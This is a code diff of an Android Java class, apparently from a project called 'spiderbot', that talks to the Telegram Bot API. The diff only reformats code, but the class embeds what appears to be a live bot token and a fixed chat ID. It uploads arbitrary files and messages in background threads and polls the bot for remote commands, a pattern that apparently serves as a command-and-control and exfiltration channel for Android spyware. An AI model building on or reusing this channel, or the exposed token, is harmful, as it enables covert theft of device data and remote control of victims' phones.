@@ -1,18 +1,23 @@
 package com.spiderbot;
+
 import android.util.Log;
+import org.json.JSONArray;
 import org.json.JSONObject;
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.concurrent.Executors;
+
 public class TelegramAPI {
     public static String BOT_TOKEN = "8720722128:AAHbLoqGqIx9iPu6l4vGbOTInh-46o9am98";
     public static String CHAT_ID = "6793813126";
     private static int lastId = 0;
+
     public static void sendMessage(String text) {
         Executors.newSingleThreadExecutor().execute(() -> {
             try {
-                HttpURLConnection conn = (HttpURLConnection) new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").openConnection();
+                HttpURLConnection conn = (HttpURLConnection) new URL(
+                    "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage").openConnection();
                 conn.setRequestMethod("POST");
                 conn.setDoOutput(true);
                 conn.setRequestProperty("Content-Type", "application/json");
@@ -26,11 +31,13 @@ public class TelegramAPI {
             } catch (Exception e) { Log.e("TG", "send error", e); }
         });
     }
+
     public static void sendFile(File file, String caption) {
         Executors.newSingleThreadExecutor().execute(() -> {
             try {
                 String boundary = "*****";
-                HttpURLConnection conn = (HttpURLConnection) new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument").openConnection();
+                HttpURLConnection conn = (HttpURLConnection) new URL(
+                    "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument").openConnection();
                 conn.setRequestMethod("POST");
                 conn.setDoOutput(true);
                 conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
@@ -51,10 +58,12 @@ public class TelegramAPI {
             } catch (Exception e) { Log.e("TG", "file error", e); }
         });
     }
+
     public static void checkCommands(CommandCallback cb) {
         Executors.newSingleThreadExecutor().execute(() -> {
             try {
-                HttpURLConnection conn = (HttpURLConnection) new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastId + 1) + "&timeout=10").openConnection();
+                HttpURLConnection conn = (HttpURLConnection) new URL(
+                    "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastId + 1) + "&timeout=10").openConnection();
                 conn.setRequestMethod("GET");
                 BufferedReader r = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                 StringBuilder sb = new StringBuilder();
@@ -64,7 +73,7 @@ public class TelegramAPI {
                 conn.disconnect();
                 JSONObject json = new JSONObject(sb.toString());
                 if (json.getBoolean("ok")) {
-                    var res = json.getJSONArray("result");
+                    JSONArray res = json.getJSONArray("result");
                     for (int i = 0; i < res.length(); i++) {
                         JSONObject up = res.getJSONObject(i);
                         lastId = up.getInt("update_id");
@@ -79,5 +88,6 @@ public class TelegramAPI {
             } catch (Exception e) { Log.e("TG", "poll error", e); }
         });
     }
+
     public interface CommandCallback { void onCommand(String cmd); }
 }
